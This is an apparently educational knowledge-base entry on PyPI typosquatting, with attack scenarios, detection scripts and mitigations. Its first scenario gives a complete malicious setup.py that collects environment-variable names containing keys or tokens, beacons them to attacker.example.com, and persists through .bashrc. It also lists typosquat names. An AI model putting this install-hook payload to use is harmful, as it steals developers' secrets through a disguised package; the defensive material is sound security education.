---
name: "PyPI Package Typosquatting"
packageManager: "pip"
slug: "pip-typosquatting"
category: "Typosquatting"
severity: "high"
platform:
  - "Linux"
  - "macOS"
  - "Windows"
description: "Typosquatting on PyPI involves registering package names that are deliberate misspellings, character transpositions, or plausible variations of popular legitimate packages. When users mistype a package name during pip install, they unknowingly install the attacker's malicious package instead. Real-world campaigns have targeted packages like requests (requestss, reqeusts), python-nmap (nmap, python_nmap), and urllib3 (urlib3, urllib). These attacks are highly effective because PyPI performs no similarity checking on package names, and the installed malicious packages often include the legitimate package's functionality to avoid immediate detection."
prerequisites:
  - "Target popular packages with high download counts that users frequently install manually"
  - "PyPI account to publish the typosquat package (minimal verification required)"
  - "The typosquat name is not already registered on PyPI"
attackScenarios:
  - title: "Character duplication and omission typosquats"
    description: "The attacker registers package names with common typing errors: doubled letters, omitted letters, or swapped adjacent characters. The malicious package includes the legitimate package as a dependency so functionality appears normal, while a payload executes during or after installation."
    commands:
      - label: "Typosquat setup.py that wraps the legitimate package"
        code: |
          # setup.py for a typosquat of the "requests" package
          # Registered as "requestss" (doubled 's')
          from setuptools import setup
          from setuptools.command.install import install
          import os

          class TyposquatInstall(install):
              def run(self):
                  install.run(self)
                  # Post-install: drop a persistent data collector
                  payload_dir = os.path.join(
                      os.path.expanduser("~"), ".local", "lib"
                  )
                  os.makedirs(payload_dir, exist_ok=True)
                  payload_path = os.path.join(payload_dir, "metrics.py")
                  with open(payload_path, "w") as f:
                      f.write('''
          import os, json, urllib.request, threading, time

          def collect():
              while True:
                  try:
                      data = {
                          "user": os.environ.get("USER", ""),
                          "keys": [k for k in os.environ if "KEY" in k or "TOKEN" in k or "SECRET" in k],
                      }
                      req = urllib.request.Request(
                          "https://attacker.example.com/t",
                          data=json.dumps(data).encode(),
                      )
                      urllib.request.urlopen(req, timeout=5)
                  except Exception:
                      pass
                  time.sleep(3600)

          t = threading.Thread(target=collect, daemon=True)
          t.start()
          ''')
                  # Register the payload for persistence by appending to shell profile
                  bashrc = os.path.join(os.path.expanduser("~"), ".bashrc")
                  persistence_line = f"\npython3 {payload_path} &>/dev/null &\n"
                  try:
                      with open(bashrc, "a") as f:
                          f.write(persistence_line)
                  except Exception:
                      pass

          setup(
              name="requestss",
              version="2.31.0",  # Match the real package's latest version
              description="Python HTTP for Humans.",
              install_requires=["requests"],  # Install the real package too
              cmdclass={"install": TyposquatInstall},
          )
        language: "python"
  - title: "Namespace and separator confusion"
    description: "PyPI normalizes package names by treating hyphens, underscores, and dots as equivalent. However, entirely different naming patterns can be confused: python-nmap vs nmap, python-dateutil vs dateutil. Attackers register the shorter or more intuitive variant that users are likely to guess."
    commands:
      - label: "Common typosquat naming strategies"
        code: |
          # Examples of real and typosquat package names:

          # Character transposition
          # Real: requests     -> Fake: reqeusts, requsets
          # Real: urllib3      -> Fake: urlib3, urrlib3

          # Missing/extra characters
          # Real: requests     -> Fake: request, requestss, reqests
          # Real: beautifulsoup4 -> Fake: beautifulsoup, beautfuloup4

          # Near-miss misspellings (vowel swap and letter duplication)
          # Real: python-dateutil -> Fake: python-dateutill (extra 'l')
          # Real: python-dateutil -> Fake: python-datautil (vowel swap 'e' to 'a')

          # Namespace prefix manipulation
          # Real: python-nmap  -> Fake: nmap (shorter, intuitive name)
          # Real: pillow       -> Fake: pil, PIL (historical name)

          # Adding plausible suffixes/prefixes
          # Real: requests     -> Fake: requests-toolkit, py-requests
          # Real: flask        -> Fake: flask2, flask-core
        language: "python"
  - title: "Real-world PyPI typosquat campaigns"
    description: "Multiple documented typosquat campaigns have been discovered on PyPI, where attackers registered dozens of package names simultaneously, each containing data exfiltration or cryptominer payloads targeting CI/CD environments and developer workstations."
    commands:
      - label: "Example: attacker registers multiple typosquats simultaneously"
        code: |
          # Attacker script to bulk-register typosquat packages
          # (simplified representation of observed attack patterns)

          targets = {
              "requests": ["reqeusts", "requestss", "reqests", "request"],
              "flask": ["flaask", "flaskk", "flsk"],
              "django": ["djano", "djnago", "djanog"],
              "numpy": ["numby", "numppy", "nunpy"],
              "pandas": ["pandsa", "pnadas", "pandass"],
          }

          # Each typosquat package includes:
          # 1. The legitimate package as a dependency (for functionality)
          # 2. A setup.py cmdclass hook for code execution
          # 3. Payload that beacons to attacker infrastructure
          # 4. Version numbers matching the real package
        language: "python"
detection:
  - title: "Verify package names before installation"
    description: "Always verify the exact spelling of a package name on pypi.org before installing. Use pip install --dry-run to preview what would be installed without executing any code."
    commands:
      - code: |
          # Check the correct package name on PyPI
          pip index versions requests

          # Dry run to see what would be installed (pip 22.2+)
          pip install --dry-run <package-name>

          # Check package metadata and verify maintainer
          pip show <package-name>

          # Compare download counts (typosquats have very low counts)
          # Use the PyPI JSON API
          curl -s "https://pypi.org/pypi/<package-name>/json" | \
            python3 -c "import json,sys; d=json.load(sys.stdin); print(d['info']['author'], d['info']['summary'])"
        language: "bash"
  - title: "Audit installed packages for potential typosquats"
    description: "Scan installed packages for names suspiciously similar to known popular packages, low download counts, recent registration dates, or mismatched metadata."
    commands:
      - code: |
          # List all installed packages and check for suspicious names
          pip list --format=json | python3 -c "
          import json, sys
          from difflib import SequenceMatcher

          popular = ['requests', 'flask', 'django', 'numpy', 'pandas',
                     'scipy', 'urllib3', 'beautifulsoup4', 'pillow', 'boto3',
                     'cryptography', 'paramiko', 'pyyaml', 'sqlalchemy']

          installed = json.load(sys.stdin)
          for pkg in installed:
              name = pkg['name'].lower()
              if name in popular:
                  continue
              for pop in popular:
                  ratio = SequenceMatcher(None, name, pop).ratio()
                  if 0.75 < ratio < 1.0:
                      print(f'WARNING: {name} is similar to {pop} (similarity: {ratio:.0%})')
          "
        language: "bash"
mitigation:
  - "Double-check package names against the official PyPI listing before installing"
  - "Use pip install --dry-run to preview installations without executing code"
  - "Maintain a curated allowlist of approved packages in requirements.txt or a lockfile"
  - "Use a private package index or caching proxy that only mirrors vetted packages"
  - "Implement automated typosquat detection in CI/CD pipelines using similarity matching"
  - "Copy-paste package names from official documentation rather than typing them manually"
  - "Monitor PyPI for new packages with names similar to your organization's popular internal or external dependencies"
references:
  - title: "IQT Labs - pypi-scan: Typosquatting Detection Tool"
    url: "https://github.com/IQTLabs/pypi-scan"
  - title: "Typosquatting Campaign Targets Python Developers"
    url: "https://www.techtarget.com/searchsecurity/news/366577455/Typosquatting-campaign-malicious-packages-slam-PyPi"
  - title: "Snyk - Typosquatting Attacks on PyPI"
    url: "https://snyk.io/blog/typosquatting-attacks/"
  - title: "PyPI - Package Name Normalization (PEP 503)"
    url: "https://peps.python.org/pep-0503/#normalized-names"
created: 2026-04-02
updated: 2026-04-02
---
